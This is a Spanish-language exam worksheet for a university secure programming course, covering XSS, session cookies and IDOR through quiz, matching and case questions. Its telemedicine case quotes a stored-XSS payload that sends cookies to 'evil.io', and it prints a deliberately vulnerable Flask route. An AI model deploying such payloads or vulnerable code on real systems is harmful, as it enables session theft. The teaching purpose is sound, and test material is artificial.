# PROGRAMACIÓN SEGURA — DD281
## Semana 6 | Gestión de Sesiones, XSS e IDOR

---

```
PROGRAMACIÓN SEGURA — DD281
Semana 6 | Gestión de Sesiones, XSS e IDOR
Nombre: _______________________ Código: __________ Fecha: __________
Tiempo: 90 minutos | Puntaje: 100 pts | Entrega: repositorio GitHub semana-06/guia/
Instrucciones: Justifique sus respuestas en C y D. En A marque solo una opción.
```

---

## SECCIÓN A — OPCIÓN MÚLTIPLE (20 puntos — 2 pts c/u)

*Marque con una X la alternativa correcta. Solo una opción es válida por pregunta.*

---

**1.** ¿Qué significa XSS en seguridad web?

a) Cross-Server Scripting — ejecución de scripts entre servidores

b) Cross-Site Scripting — inyección de scripts en páginas web vistas por otros usuarios

c) Cross-System Security — protocolo de seguridad entre sistemas

d) Client-Side Script Execution — ejecución de scripts del lado del cliente por el servidor

---

**2.** ¿Cuál es el propósito del atributo `HttpOnly` en una cookie de sesión?

a) Permite que la cookie solo funcione en conexiones HTTP, no HTTPS

b) Impide que el servidor acceda a la cookie directamente

c) Impide que el código JavaScript acceda a la cookie desde el navegador

d) Limita el tamaño máximo del valor almacenado en la cookie

---

**3.** ¿Qué es IDOR (Insecure Direct Object Reference)?

a) Un tipo de ataque que intercepta comunicaciones entre cliente y servidor

b) Una vulnerabilidad donde un usuario accede a recursos de otros usuarios cambiando un identificador en la URL o request

c) Un método para encriptar los identificadores de objetos en la base de datos

d) Un protocolo para referenciar objetos de forma segura entre microservicios

---

**4.** ¿Qué función de Python/Flask convierte `<script>` en `&lt;script&gt;` para prevenir XSS?

a) `str.encode()`

b) `urllib.parse.quote()`

c) `html.escape()`

d) `base64.b64encode()`

---

**5.** Un foro web guarda los comentarios en la BD y los muestra sin escapar a todos los usuarios. ¿Qué tipo de XSS es este?

a) XSS Reflejado (Reflected XSS)

b) XSS basado en DOM (DOM-based XSS)

c) XSS Almacenado (Stored/Persistent XSS)

d) XSS de segundo orden (Second-order XSS)

---

**6.** ¿Qué hace el atributo `SameSite=Strict` en una cookie?

a) Restringe la cookie para que solo se envíe en requests al mismo sitio web de origen

b) Cifra el contenido de la cookie con AES-256

c) Limita la cookie a solo el directorio raíz del sitio

d) Impide que la cookie sea modificada por el usuario

---

**7.** ¿Cuál es la diferencia entre sanitizar el input y escapar el output?

a) Son términos sinónimos que describen el mismo proceso

b) Sanitizar elimina o modifica caracteres peligrosos al recibirlos; escapar los convierte en representaciones seguras al mostrarlos

c) Sanitizar se aplica a HTML; escapar se aplica a SQL

d) Sanitizar es para el backend; escapar es para el frontend

---

**8.** Un desarrollador implementa CSP con `script-src 'unsafe-inline'`. ¿Qué problema tiene esta configuración?

a) Ninguno — unsafe-inline es la configuración recomendada por OWASP

b) Permite la ejecución de scripts inline, lo que anula la protección principal del CSP contra XSS

c) Bloquea completamente todos los scripts, rompiendo la funcionalidad del sitio

d) Solo afecta a navegadores Internet Explorer, no a Chrome o Firefox

---

**9.** ¿Por qué se debe regenerar el session ID después de un login exitoso?

a) Para reducir el tamaño de la cookie y mejorar el rendimiento

b) Para prevenir Session Fixation, donde un atacante que conocía el session ID previo no pueda usarlo después de la autenticación

c) Porque los session IDs tienen un formato diferente para usuarios autenticados

d) Para cumplir con el estándar OAuth 2.0 de autenticación

---

**10.** En una API REST que devuelve `403 Forbidden` cuando se accede a un recurso de otro usuario y `404 Not Found` cuando no existe, ¿qué riesgo de seguridad existe?

a) Ninguno — usar los códigos HTTP correctos es una buena práctica

b) Permite enumeración de recursos: el atacante sabe cuáles IDs existen (403) y cuáles no (404)

c) El código 403 viola el estándar REST y puede causar errores en los clientes

d) Los usuarios pueden ver los datos de otros usuarios basándose en el código de error

---

## SECCIÓN B — COMPLETAR Y RELACIONAR (20 puntos)

### B1. Complete los espacios en blanco (10 pts — 2 pts c/u)

1. XSS almacenado es más peligroso que XSS reflejado porque el payload se guarda en la _________________ del servidor y ataca a _________________ los usuarios que visiten la página.

2. El atributo _________________ en una cookie de sesión garantiza que solo se transmita a través de conexiones HTTPS, previniendo el robo por sniffing en redes inseguras.

3. La vulnerabilidad IDOR pertenece a la categoría OWASP _________________ (código) denominada _________________ en español.

4. Content Security Policy (CSP) se implementa como un _________________ HTTP y permite al servidor declarar qué _________________ de contenido son legítimas para el navegador.

5. Para prevenir Session Fixation, el servidor debe _________________ el identificador de sesión inmediatamente después de que el usuario se _________________ exitosamente.

---

### B2. Relacionar columnas (10 pts — 1.67 pts c/u)

*Escriba en la columna del medio la letra de la opción correcta de la Columna B.*

| Columna A — Concepto | Respuesta | Columna B — Descripción / Ejemplo |
|---|---|---|
| 1. XSS Reflejado | → ___ | a) `Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict` |
| 2. XSS Almacenado | → ___ | b) `GET /factura/1234` → cambiar a `/factura/1235` para ver facturas ajenas |
| 3. IDOR | → ___ | c) Script inyectado en comentario de blog que roba cookies de todos los lectores |
| 4. Session Fixation | → ___ | d) `<script>document.cookie</script>` enviado en parámetro de búsqueda de URL |
| 5. Cookie segura | → ___ | e) `Content-Security-Policy: default-src 'self'; script-src 'self'` |
| 6. CSP | → ___ | f) Atacante envía link `login?PHPSESSID=CONOCIDO123` antes de que víctima se autentique |

---

## SECCIÓN C — ANÁLISIS Y REFLEXIÓN (30 puntos)

### C1. (10 puntos)

Analice el siguiente fragmento de código Flask e identifique:

**(a)** ¿Qué vulnerabilidad(es) contiene?

**(b)** ¿Cómo un atacante la explotaría? Proporcione un ejemplo concreto.

**(c)** ¿Cómo la corregiría? Incluya el código corregido.

```python
@app.route('/perfil')
def ver_perfil():
    nombre = request.args.get('nombre', '')
    return f"<h1>Perfil de {nombre}</h1><p>Bienvenido al sistema</p>"
```

*Espacio para respuesta:*

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

---

### C2. (10 puntos)

Una aplicación de e-commerce tiene el endpoint `GET /api/orden/{id}` que devuelve los detalles de una orden. El código del servidor verifica que el usuario esté autenticado pero **no** verifica si la orden pertenece al usuario autenticado.

**(a)** ¿Qué vulnerabilidad describe este escenario y cómo la clasificarías según OWASP?

**(b)** Describa paso a paso cómo un atacante la explotaría.

**(c)** Escriba en pseudocódigo la verificación de autorización correcta.

*Espacio para respuesta:*

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

---

### C3. Mini caso (10 puntos)

El equipo de seguridad de EduPerú (plataforma educativa con 200,000 estudiantes) encontró en sus logs estas cookies de sesión activas de usuarios:

```
Set-Cookie: usuario_session=eyJ1c2VyX2lkIjogMTIzNH0=; Path=/
```

**(a)** ¿Cuántos problemas de seguridad identifica en esta cookie? Enumérelos. (5 pts)

**(b)** ¿Qué contiene el valor `eyJ1c2VyX2lkIjogMTIzNH0=` y por qué es un riesgo? *Pista: es Base64.* (5 pts)

*Espacio para respuesta:*

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

---

## SECCIÓN D — AVANZADO Y DE CASO (30 puntos)

**Caso profesional:** MedApp, una aplicación de telemedicina con 50,000 pacientes, implementó el siguiente sistema de mensajería entre pacientes y médicos. Durante una auditoría de seguridad, el equipo encontró que un médico malintencionado había enviado el siguiente mensaje a todos sus pacientes:

```
Hola, <img src="x" onerror="fetch('https://evil.io/steal?data='+btoa(document.cookie))">
```

Además, se reportó que pacientes podían ver historiales clínicos de otros pacientes cambiando el parámetro `paciente_id` en la URL del endpoint `/historial`.

---

### D1. Análisis técnico del ataque (10 puntos)

Analice técnicamente el ataque del médico malintencionado respondiendo:

- ¿Qué tipo de XSS es? ¿Por qué no usó `<script>` directamente?
- ¿Qué hace exactamente `btoa(document.cookie)`?
- ¿Qué información de los pacientes está en riesgo?
- ¿Cómo clasifica este ataque según OWASP y qué impacto legal tiene en Perú?

*Espacio para respuesta:*

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

---

### D2. Diseño de solución (10 puntos)

¿Cómo implementarías un sistema de mensajería seguro que prevenga tanto el XSS como el IDOR de historiales clínicos?

Describe la arquitectura de seguridad: no el código completo, sino los controles clave, las verificaciones necesarias y las configuraciones de sesión que aplicarías.

*Espacio para respuesta:*

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

---

### D3. Pensamiento crítico (10 puntos)

El CTO de MedApp propone como solución al XSS: *"filtrar todos los mensajes que contengan las palabras `script`, `onerror`, `onclick` y `javascript`"*.

Responda:

1. ¿Esta solución es suficiente? Justifique.
2. Mencione al menos **3 técnicas de bypass** que un atacante podría usar para evitar este filtro.
3. Explique por qué el **escape de output** es superior a los filtros de input para prevenir XSS.

*Espacio para respuesta:*

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

_______________________________________________________________________________

---

*Fin de la guía — Semana 6 | Universidad Autónoma del Perú | Programación Segura DD281*
